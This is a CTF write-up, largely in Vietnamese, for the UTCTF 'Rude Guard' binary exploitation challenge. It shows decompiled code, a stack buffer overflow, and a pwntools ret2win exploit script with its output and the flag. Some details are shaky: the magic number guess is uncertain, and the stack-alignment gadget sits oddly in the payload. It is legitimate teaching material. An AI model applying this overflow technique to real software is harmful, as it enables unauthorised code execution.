---
title: "UTCTF - Rude Guard - Binary Exploitation"
date: 2024-01-11 00:00:00 +0700
categories: [CTF, Binary Exploitation]
tags: [pwn, ret2win, stack-overflow, argv, utctf]
author: datious
description: "UTCTF writeup: Rude Guard — bypass argv check rồi ret2win qua buffer overflow trong read_input()."
---

# UTCTF - Rude Guard - Binary Exploitation
**Author: D1n0_09**

## 1. Sơ lược về chương trình

### Main function

```c
undefined8 main(int param_1, long param_2)
{
  int iVar1;
  
  if (param_1 == 1) {
    puts("Are you not going to say hello?");
  }
  else {
    iVar1 = atoi(*(char **)(param_2 + 8));
    if (iVar1 == 1701604463) {
      puts("Hi. What do you want.");
      read_input(0);
    }
    else {
      puts("Hi. Go away.");
    }
  }
  return 0;
}
```

### read_input function

```c
undefined8 read_input(int param_1)
{
  int iVar1;
  char local_28 [32];
  
  read(param_1, local_28, 100);    // ← 100 bytes vào buffer 32 bytes!
  iVar1 = strcmp(local_28, "givemeflag\n");
  if (iVar1 == 0) {
    puts("How rude! utflag{you're going to need a sneakier way in...}");
  }
  else {
    puts("I won't let you pass. No matter what.");
  }
  return 0;
}
```

## 2. Analysis

- `main()` kiểm tra `argv[1]` — phải pass `1701604463` (decimal của `"morn"` in ASCII? Thực ra là một magic number).
- `read_input()`: đọc **100 bytes** vào buffer **32 bytes** → **Buffer Overflow!**
- Có hàm `secret_function` in flag thực sự → mục tiêu là ret2win.

## 3. Khai thác

```
Buffer (local_28) = 32 bytes
+ saved RBP      = 8 bytes
= offset 40      → overwrite RIP
```

### Exploit script

```python
#!/usr/bin/python3
from pwn import *

exe = ELF('./pwnable', checksec=False)
p = process([exe.path, '1701604463'])

gdb.attach(p, gdbscript='''
b*0x000000000040120e
c
''')

payload  = b'A' * 40
payload += p64(exe.sym['secret_function'])
payload += p64(0x00000000004011e1)   # ret gadget for stack alignment

p.send(payload)
p.interactive()
```

### Output

```
(pwnenv)─(kali㉿kali)-[~/Downloads/utctf]
└─$ python3 solve.py
[+] Starting local process '/home/kali/Downloads/utctf/pwnable': pid 3652
[*] running in new terminal: ['/usr/bin/gdb', '-q', ...]
[+] Waiting for debugger: Done
[*] Switching to interactive mode
Hi. What do you want.
I won't let you pass. No matter what.
utflag{gu4rd_w4s_w34ker_th4n_i_th0ught}
[*] Got EOF while reading in interactive
```

**Flag: `utflag{gu4rd_w4s_w34ker_th4n_i_th0ught}`** 🎉
